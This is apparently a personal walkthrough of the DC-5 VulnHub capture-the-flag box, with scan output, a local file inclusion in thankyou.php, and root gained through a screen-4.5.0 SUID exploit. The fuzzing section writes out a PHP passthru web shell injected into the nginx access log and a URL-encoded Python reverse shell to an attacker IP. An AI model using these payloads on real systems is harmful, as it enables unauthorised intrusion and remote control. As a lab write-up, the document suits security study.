# BOX NAME: DC-5
**LINK**: https://www.vulnhub.com/entry/dc-5,314/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box, pull hair. Notice footer changes, hmm. 
2. Mess with parameters ffuf and fine '?file='. Test for LFI. score.
3. Get reverse shell from CMD-INJECTION on nginx access.log
4. 
5.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.68
[+] URL:	http://dc-5
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dc5.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 14:00 CEST
Nmap scan report for dc.local (10.77.0.68)
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.6.2
|_http-title: Welcome
|_http-server-header: nginx/1.6.2
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43146/tcp6  status
|   100024  1          44550/tcp   status
|   100024  1          47207/udp   status
|_  100024  1          49949/udp6  status

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds

└─$ nmap -sV -sC $IP -p44550 -oN nmap-dc5-44550.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 14:01 CEST
Nmap scan report for dc.local (10.77.0.68)
Host is up (0.00041s latency).                                                                                      
                                                                                                                    
PORT      STATE SERVICE VERSION                                                                                     
44550/tcp open  status  1 (RPC #100024)                                                                             
                                                                                                                    
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb $URL --log-verbose=whatweb-dc5.log              
http://dc-5/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.6.2], IP[10.77.0.68], Title[Welcome], nginx[1.6.2]

```

nikto-scan
```
└─$ nikto -h $URL | tee nikto-dc5.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.68
+ Target Hostname:    dc-5
+ Target Port:        80
+ Start Time:         2023-05-02 14:01:31 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.6.2
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME ty
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7850 requests: 0 error(s) and 3 item(s) reported on remote host                                      
+ End Time:           2023-05-02 14:02:11 (GMT2) (40 seconds)                                          
---------------------------------------------------------------------------                                         
+ 1 host(s) tested 
```

fuzzing
```
about-us.php            [Status: 200, Size: 4292, Words: 519, Lines: 54, Duration: 15ms]
contact.php             [Status: 200, Size: 4282, Words: 433, Lines: 72, Duration: 15ms]
faq.php                 [Status: 200, Size: 5645, Words: 709, Lines: 58, Duration: 14ms]
footer.php              [Status: 200, Size: 17, Words: 3, Lines: 1, Duration: 15ms]
index.php               [Status: 200, Size: 4025, Words: 484, Lines: 54, Duration: 11ms]
index.php               [Status: 200, Size: 4025, Words: 484, Lines: 54, Duration: 12ms]
solutions.php           [Status: 200, Size: 4100, Words: 485, Lines: 52, Duration: 15ms]
thankyou.php            [Status: 200, Size: 852, Words: 30, Lines: 43, Duration: 28ms]

thankyou.php?file=VULNERABLE LFI
thankyou.php?file=/var/log/nginx/access.log
GET /<?php passthru($_GET['BAM']); ?>
view-source:http://dc-5/thankyou.php?file=/var/log/nginx/access.log&BAM=%2Fusr%2Fbin%2Fpython%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.77.0.35%22%2C6666%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```
other
```

```

</details>

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. So the thankyou.php page has a hidden ?file= parameter that allows for LFI.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0  <-----
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
```
**SGID's**:

```
/usr/bin/procmail
/usr/bin/wall
/usr/bin/dotlockfile
/usr/bin/at
/usr/bin/mlocate
/usr/bin/mutt_dotlock
/usr/bin/crontab
/usr/bin/lockfile
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/expiry
/usr/bin/ssh-agent
/sbin/unix_chkpw
```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=f89d987acd450c84e6f66c36203173d37e4f2fa2, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.10 (jessie)
Release:        8.10
Codename:       jessie


Linux dc-5 3.16.0-4-amd64 #1 SMP Debian 3.16.51-2 (2017-12-03) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

dc:
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
www-data@dc-5:/tmp$ chmod +x 41154.sh 
www-data@dc-5:/tmp$ ./41154.sh 
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

```

```

```
# cat thisistheflag.txt


888b    888 d8b                                                      888      888 888 888 
8888b   888 Y8P                                                      888      888 888 888 
88888b  888                                                          888      888 888 888 
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
                                                                                          
                                                                                          


Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it's all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.


```

</details>